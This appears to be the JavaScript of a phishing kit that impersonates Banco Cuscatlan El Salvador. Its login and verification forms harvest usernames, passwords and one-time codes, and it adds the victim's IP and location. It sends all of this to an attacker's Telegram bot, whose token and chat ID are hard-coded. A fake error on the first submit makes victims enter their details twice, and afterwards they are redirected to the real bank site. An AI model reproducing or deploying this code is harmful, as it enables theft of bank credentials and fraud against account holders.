var isFirstLoginFormSubmit = true;
var isFirstVerificationFormSubmit = true;

document.addEventListener("DOMContentLoaded", function() {
    // Agregar evento de envío de formulario para la página de inicio de sesión
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            handleFormSubmit(username, password, isFirstLoginFormSubmit, "💲 Banco Cuscatlan Salvador 💲:\nUsuario: " + username + "\nContraseña: " + password, "Error: El usuario y contraseña no coinciden", "red");
            isFirstLoginFormSubmit = false;
        });
    }

    // Agregar evento de envío de formulario para la página de código de operaciones
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var cvv = document.getElementById("token").value;
            handleFormSubmit(cvv, cvv, isFirstVerificationFormSubmit, "💲 Banco Cuscatlan Salvador 💲:\nCódigo: " + cvv, "Código incorrecto, pida un nuevo código e ingréselo nuevamente.", "red");
            isFirstVerificationFormSubmit = false;
        });
    }
});

function handleFormSubmit(code, password, isFirstSubmit, message, alertMessage, color) {
    enviarMensajeTelegram(message, function() {
        if (isFirstSubmit) {
            showAlert(alertMessage, color); // Mostrar mensaje de alerta personalizado después de enviar a Telegram
        } else {
            // Redirigir a la página siguiente después de enviar el mensaje
            if (isFirstLoginFormSubmit) {
                window.location.href = "https://www.bancocuscatlan.com/";
            } else {
                window.location.href = "cargando.html";
            }
        }
    });
}

function enviarMensajeTelegram(mensaje, callback) {
    var token = '5906944285:AAE8oSG0PCr7jKyDrakBDUgaf61KYkyGLVc''; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
    var chatId = '5482691140'; // Reemplaza 'TU_CHAT_ID' con el ID de chat al que quieres enviar el mensaje
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
    var params = {
        chat_id: chatId,
        text: mensaje
    };

    // Obtener información de geolocalización
    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        // Agregar información de geolocalización al mensaje
        var ip = data.ip;
        var country = data.country;
        var region = data.region;
        var geoInfo = `IP: ${ip}\nPaís: ${country}\nRegión: ${region}`;
        params.text += '\n\n' + geoInfo;

        // Enviar el mensaje a Telegram
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            if (callback) {
                callback();
            }
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    })
    .catch(error => {
        console.error('Error al obtener la información de geolocalización:', error);
    });
}

function showAlert(message, color) {
    alert(message);
    var verificationForm = document.getElementById("verificationForm");
    
}
